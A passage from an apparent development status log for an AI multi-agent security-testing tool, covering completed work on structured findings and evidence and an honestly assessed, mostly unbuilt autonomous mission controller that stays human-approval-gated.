      `confirmed`/`false_positive`/`reported`/`duplicate`. Every finding (and each history entry)
      loaded from disk is migrated from the old vocabulary automatically
      (`findingsManager.ts#migrateFinding`: discovered/updated→potential, verified→confirmed,
      dismissed→false_positive) - no manual migration step, existing project data keeps working.
- [x] `Related tool executions` — `Finding.executionIds: string[]`, populated by
      `ingestExecution`/`upsertFinding` passing the triggering `ExecutionRecord.id` through
- [x] `Related agents` — `Finding.relatedAgents: string[]`, stamped by the new `create_finding`
      pseudo-tool (`createAgentFinding`) and accumulated across re-detection by a different agent
- [x] Evidence system (partial) — `Finding.evidence` is now `EvidenceItem[]`
      (`http_request`/`http_response`/`terminal_output`/`tool_result`/`agent_reasoning`/`note`,
      each with `content`+`createdAt`), capped at 20 items (oldest dropped first), deduplicated by
      content, rendered as a real list in `FindingDetails.tsx` instead of one flat `<pre>` block.
      Old string-shaped evidence is migrated into a single `note` item on load, same mechanism as
      the status migration. **Not done**: screenshots/file attachments - would need a binary upload
      endpoint and storage directory, a genuinely separate feature; text-based evidence types are
      fully supported, binary ones are not.
- [x] **Agents can create findings directly** (the task's headline ask) — new `create_finding`
      pseudo-tool in `orchestrator.ts` (JSON-payload-in-arguments[0] convention, same tool-result
      envelope as `query_findings`/`lookup_cves`), always listed in the preamble, skips human
      confirmation (records data, doesn't execute anything - same reasoning as manual finding
      creation already being ungated). Previously agents could only *read* findings via
      `query_findings`, never create one - this was the real gap behind "instead of only writing
      text" in the original task description.
- [ ] `Asset`/`URL`/`Endpoint` as distinct fields — still not a separate structured entity; `target`/
      `value`/`type: "endpoint"` cover most of this in practice (same underlying gap as Task 3's
      Assets view, which is itself derived from these same fields) - not pursued further this pass.

**Status: done (2026-08-08), with one disclosed partial gap** (binary evidence attachments). 328
backend / 252 frontend tests (new: `findingsManager.test.ts` +12 cases covering migration/
executionIds/evidence-cap/createAgentFinding/new filters, `orchestrator.test.ts` +6 cases for
`create_finding`, `FindingDetails.test.tsx` — new, 12 cases, `FindingsTable.test.tsx`/
`FindingsTimeline.test.tsx`/`AssetsView.test.tsx`/`useFindings.test.ts` updated for the new
vocabulary/evidence shape), both `tsc` checks and `oxlint` clean. Verified live against the real
`showpad.com` project: confirmed existing on-disk findings migrated correctly (old `"verified"` →
`"confirmed"`, string evidence → a `note`-typed `EvidenceItem`), created a finding with
parameter/impact/reproductionSteps/evidence via the API and confirmed it round-tripped correctly,
and visually confirmed the new Status column, status button group, Details form, and Evidence list
all render correctly in the browser.

### Task 5 — Autonomous Security Mission Controller

> Create a high-level Mission Controller above the existing multi-agent orchestrator. User provides
> "Assess this authorized target according to the defined scope." The Controller should read the
> scope, create a recon plan, assign tasks to agents, execute approved tools, collect results,
> update the asset inventory, identify attack surfaces, create follow-up tasks, assign specialist
> agents, validate vulnerabilities, create confirmed findings, collect evidence, and prepare a
> report - agents handing work to other agents automatically (Planner → Recon → Web Analyzer → ... →
> Report Writer). The UI must show this as a live mission graph (current/completed/waiting agents,
> pending tasks, tool executions, findings, approval requests, mission progress). Human stays the
> approval authority; no uncontrolled autonomous exploitation; scope-aware and confirmation-gated.

- [x] A real multi-agent execution primitive exists — `services/multiAgentOrchestrator.ts`
      (`createPlan`/`resumePlan`/`provideStepGuidance`/`cancelPlan`), each step a full single-agent
      Orchestrator task (tools + human confirmation all apply), context chained step to step
- [x] Human stays the approval authority, confirmation-gated — inherited from the single-agent
      Orchestrator underneath every step; nothing in this codebase's design bypasses it anywhere
- [ ] **Automatic** planning from one high-level instruction — `createPlan` takes a
      user-*authored*, ordered `{agent, objective}[]` list (`MultiAgentPlanner.tsx`'s step
      builder); there is no "Assess this target" single-input mode that decides the agent sequence
      itself
- [ ] Automatic hand-off / dynamic re-planning (assign specialist agents, create follow-up tasks
      based on what recon finds) — plans are static once created; a step can't spawn new steps or
      choose the next agent based on its own results
- [ ] Asset-inventory updates as an explicit mission-controller responsibility — depends on Task 3's
      Assets concept existing first
- [ ] A live "mission graph" UI (current/completed/waiting agents, pending tasks, tool executions,
      findings, approval requests, mission progress, all in one visual) — `MultiAgentPlanner.tsx`
      shows a step builder + linear run view with collapsible completed-step summaries, not a graph;
      `AgentNetwork.tsx` is graph-shaped but visualizes open chat/task *sessions*, not a mission's
      live execution state
- [ ] Report preparation as the final automatic step of a mission — Report generation exists
      (`reportManager.ts`) but is a separate, manually-triggered action (select findings → generate),
      not something a controller invokes on its own at the end of a run

**Real gaps**: nearly the whole thing. What exists (`multiAgentOrchestrator.ts`) is a solid
foundation - a "Mission Controller" could plausibly be built as a layer that (1) takes one
objective, (2) calls an LLM (e.g. the existing Planner agent) to *decide* the `{agent, objective}[]`
plan instead of requiring the user to author it, (3) feeds that into the existing `createPlan`, and
(4) adds a real-time graph view on top of a plan's existing step statuses - but that's a genuinely
large feature, depends on Task 3's Assets/scope work for the "update asset inventory"/scope-aware
parts to mean anything, and hasn't been started. Almost certainly the last of the five to tackle.